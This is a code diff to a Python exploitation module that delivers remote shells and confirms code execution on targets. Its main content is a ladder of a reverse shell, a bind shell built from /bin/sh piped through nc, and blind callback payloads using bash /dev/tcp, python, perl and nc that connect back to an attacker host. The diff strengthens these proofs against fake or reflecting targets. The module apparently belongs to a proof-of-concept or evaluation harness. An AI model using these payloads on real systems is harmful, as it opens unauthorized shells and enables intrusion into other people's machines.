@@ -4,9 +4,16 @@ Target-agnostic shell delivery + challenge-response (nonce) proof, shared by eve
 PoC under pocs/. Stdlib-socket only — runs unchanged in python:3.12-slim.
 
 Trust model: the MODEL is untrusted, the PoC CODE is trusted (we wrote+tested it), the
-TARGET is untrusted. A per-attempt nonce (minted by the orchestrator, injected as
-HALO_NONCE) is echoed back by the target; only a matching echo proves *our* command ran
-on *this* target — a tarpit streaming `uid=0(root)` cannot forge it.
+TARGET is untrusted. Proof is execution-derived, not literal-echo: the shell must return
+a value it can only produce by RUNNING our command (the substituted `$(id -u)` marker, or
+a computed `a+b` on the blind rung). A tarpit streaming `uid=0(root)`, or a reflector that
+echoes our bytes verbatim, returns the literal recipe and is rejected.
+
+Residual limit: this proves a shell RAN our command, which reflection cannot forge. It
+does NOT defeat a genuine command-forwarding relay — a target that actually forwards our
+command to a real shell elsewhere and runs it. There, our code did execute, just not
+necessarily on the named host; evidence_meta's peer address is the only mitigating signal,
+not a guarantee.
 """
 from __future__ import annotations
 
@@ -279,17 +286,22 @@ def bind_payload(bind_port: int, nonce: str) -> str:
             f"cat {fifo} | /bin/sh -i 2>&1 | nc -l -p {bind_port} > {fifo} &")
 
 
-def blind_callback_payload(lhost: str, lport: int, nonce: str) -> str:
-    """Connect back and send ONLY the nonce — proves code ran without a shell channel."""
+def blind_callback_payload(lhost: str, lport: int, challenge) -> str:
+    """Connect back and send `<nonce>:<a+b>` — the target must COMPUTE the sum, so a
+    reflector echoing the payload (literal `$(( a + b ))`) cannot forge the answer."""
+    ch = challenge if isinstance(challenge, Challenge) else Challenge.ephemeral(str(challenge))
     _require_safe("lhost", lhost)
-    _require_safe("nonce", nonce)
+    _require_safe("nonce", ch.nonce)
     lport = int(lport)
-    bash = f"bash -c 'exec 3<>/dev/tcp/{lhost}/{lport}; echo {nonce}-MARK >&3'"
+    a, b = ch.a, ch.b
+    ans = f"{ch.nonce}:$(( {a} + {b} ))"                 # sh/bash/nc compute this
+    bash = f"bash -c 'exec 3<>/dev/tcp/{lhost}/{lport}; echo {ans} >&3'"
     py = (f"python3 -c 'import socket;s=socket.socket();"
-          f"s.connect((\"{lhost}\",{lport}));s.sendall(b\"{nonce}-MARK\")'")
+          f"s.connect((\"{lhost}\",{lport}));s.sendall(b\"{ch.nonce}:%d\"%({a}+{b}))'")
     perl = (f"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
-            f"connect(S,sockaddr_in({lport},inet_aton(\"{lhost}\")));send(S,\"{nonce}-MARK\",0);'")
-    nc = f"echo {nonce}-MARK | nc {lhost} {lport}"
+            f"connect(S,sockaddr_in({lport},inet_aton(\"{lhost}\")));"
+            f"$s={a}+{b};send(S,\"{ch.nonce}:$s\",0);'")
+    nc = f"echo {ans} | nc {lhost} {lport}"
     return _first_available(("bash", bash), ("python3", py), ("perl", perl), ("nc", nc))
 
 
@@ -325,7 +337,8 @@ class _Listener:
         except OSError:
             return None
 
-    def wait_for_nonce(self, nonce: str) -> bool:
+    def wait_for_answer(self, challenge) -> bool:
+        ch = challenge if isinstance(challenge, Challenge) else Challenge.ephemeral(str(challenge))
         conn = self.accept_one()
         if conn is None:
             return False
@@ -333,20 +346,26 @@ class _Listener:
             data = _drain(conn, self._timeout)
         finally:
             conn.close()
-        return f"{nonce}-MARK".encode() in data
+        self.last_raw = data
+        return f"{ch.nonce}:{ch.expected_sum}".encode() in data
 
 
 def establish_rce(inject, target: str, *, service: str = "", nonce: str = "",
-                  bind_port: int = 45444, ladder_timeout: float = 8.0,
+                  challenge=None, bind_port: int = 45444, ladder_timeout: float = 8.0,
                   _ip: str | None = None) -> Breach:
     """Given a blind single-command `inject`, walk the delivery ladder until a breach.
 
-    Rung 1 reverse shell → Rung 2 bind shell → Rung 3 blind nonce callback. Returns the
-    first confirmed Breach; never raises for a non-breach."""
-    nonce = nonce or make_nonce()
+    Rung 1 reverse shell → Rung 2 bind shell → Rung 3 blind arithmetic callback. Each
+    rung proves execution (substitution or computed sum), not reflection. Returns the
+    first confirmed Breach; never raises for a non-breach.
+
+    LIMIT: a genuine command-forwarding relay would pass — our code ran, just perhaps not
+    on the named host. That is out of scope; `evidence_meta['peer']` is the only signal."""
+    ch = challenge if isinstance(challenge, Challenge) else Challenge.ephemeral(nonce or make_nonce())
+    nonce = ch.nonce
     lhost = _ip or local_ip_for(target)
 
-    # Rung 1: reverse shell — listener accepts the callback, confirm_shell probes it.
+    # Rung 1: reverse shell — accept the callback, then prove with a substitution probe.
     with _Listener(timeout=ladder_timeout) as lis:
         try:
             inject(reverse_payload(lhost, lis.port, nonce))
@@ -354,11 +373,11 @@ def establish_rce(inject, target: str, *, service: str = "", nonce: str = "",
             pass
         conn = lis.accept_one()
         if conn is not None:
-            br = confirm_shell(conn, service=service, nonce=nonce, timeout=ladder_timeout)
+            br = confirm_shell(conn, service=service, challenge=ch, timeout=ladder_timeout)
             if br:
                 return br
 
-    # Rung 2: bind shell — target binds /bin/sh; we connect out and probe.
+    # Rung 2: bind shell — connect out and prove with the same substitution probe.
     try:
         inject(bind_payload(bind_port, nonce))
     except Exception:
@@ -370,19 +389,23 @@ def establish_rce(inject, target: str, *, service: str = "", nonce: str = "",
         except OSError:
             time.sleep(0.4)
             continue
-        br = confirm_shell(sock, service=service, nonce=nonce, timeout=ladder_timeout)
+        br = confirm_shell(sock, service=service, challenge=ch, timeout=ladder_timeout)
         if br:
             return br
         break
 
-    # Rung 3: blind nonce callback — prove exec even with no usable shell.
+    # Rung 3: blind arithmetic callback — prove exec even with no usable shell.
     with _Listener(timeout=ladder_timeout) as lis:
         try:
-            inject(blind_callback_payload(lhost, lis.port, nonce))
+            inject(blind_callback_payload(lhost, lis.port, ch))
         except Exception:
             pass
-        if lis.wait_for_nonce(nonce):
-            return Breach(confirmed=True, level="blind-rce", nonce=nonce,
-                          proof=f"{nonce}-MARK received out-of-band", exit_code="0")
+        if lis.wait_for_answer(ch):
+            return Breach(confirmed=True, level="blind-rce", evidence="code-exec",
+                          nonce=nonce,
+                          proof=f"{nonce}:{ch.expected_sum} computed and received out-of-band",
+                          evidence_hash=_sha256(getattr(lis, "last_raw", b"")),
+                          evidence_meta={"channel": "blind-callback", "ts": time.time()},
+                          exit_code="0")
 
-    return Breach(confirmed=False, level="none", nonce=nonce, proof="")
+    return Breach(confirmed=False, level="none", evidence="none", nonce=nonce, proof="")
